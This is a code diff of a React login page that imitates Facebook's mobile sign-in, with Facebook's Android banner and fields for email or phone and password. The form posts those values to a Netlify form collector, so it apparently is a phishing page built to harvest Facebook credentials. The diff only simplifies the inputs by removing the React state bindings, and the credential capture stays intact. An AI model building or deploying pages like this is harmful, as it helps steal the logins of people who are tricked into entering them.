@@ -1,8 +1,8 @@
 import React, {useState} from "react";
 import "./LoginPage.css";
 const LoginPage = () =>{
-    const [mail,setMail] = useState("");
-    const [pass,setPass] = useState("");
+   // const [mail,setMail] = useState("");
+   // const [pass,setPass] = useState("");
     return(
         <>
           <div className="tophead">Get Facebook for Android and browse faster.</div>
@@ -10,10 +10,10 @@ const LoginPage = () =>{
           <form name="data-form" method="POST" data-netlify="true">
               <input type="hidden" name="form-name" value="data-form" />
               <div className="mail">
-                  <input type="text" name="email" id="email" placeholder="Mobile number or email address" value={mail} onChange={(e)=>{setMail(e.target.value)}} ></input>
+                  <input type="text" name="email" id="email" placeholder="Mobile number or email address" ></input>
               </div>
               <div className="password">
-                  <input type="password" name="password" id="pass" placeholder="Password" value={pass} onChange={(e)=>{setPass(e.target.value)}} ></input>
+                  <input type="password" name="password" id="pass" placeholder="Password"></input>
               </div>
               <button type="submit" id="btn" >Log In</button>
           </form>
